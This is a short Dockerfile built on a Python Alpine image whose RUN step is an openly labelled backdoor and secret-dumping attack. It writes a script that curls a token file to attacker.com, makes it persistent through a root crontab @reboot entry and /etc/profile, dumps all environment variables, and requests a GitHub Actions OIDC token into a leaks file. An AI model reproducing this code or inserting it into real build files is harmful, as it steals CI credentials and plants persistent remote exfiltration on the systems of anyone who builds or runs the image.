FROM python:3.11-alpine  
ARG PYTHON_VERSION  

RUN apk add --no-cache curl && \  
    echo "[+] Installing backdoor..." && \  
    echo '#!/bin/sh' > /usr/local/bin/init.sh && \  
    echo 'curl -s http://attacker.com/exfil?token=\$(cat /token)' >> /usr/local/bin/init.sh && \  
    chmod +x /usr/local/bin/init.sh && \  
    echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root && \  
    echo "/usr/local/bin/init.sh" >> /etc/profile && \  
    echo "[+] Dumping secrets..." && \  
    { echo "===== ENV ====="; printenv; echo "===== OIDC TOKEN ====="; curl -H "Authorization: bearer \$ACTIONS_ID_TOKEN_REQUEST_TOKEN" "\$ACTIONS_ID_TOKEN_REQUEST_URL"; } > /leaks.txt  
